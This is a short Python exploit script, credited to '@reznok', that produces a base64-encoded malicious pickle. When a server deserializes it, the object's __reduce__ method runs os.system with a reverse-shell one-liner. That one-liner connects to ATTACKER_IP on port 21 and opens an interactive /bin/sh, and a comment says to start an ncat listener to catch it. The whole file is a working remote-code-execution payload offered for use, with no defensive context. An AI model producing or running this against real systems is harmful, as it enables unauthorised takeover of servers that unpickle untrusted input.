""" Exploit Script, courtesy @reznok """
import pickle
import base64

# Setup a listener on attack box (either ncat or nc):
# ncat -lvk 21

ATTACKER_IP = "x.x.x.x"
ATTACKER_PORT = 21

COMMAND = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ATTACKER_IP, ATTACKER_PORT)

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print(base64.b64encode(pickle.dumps(PickleRce())))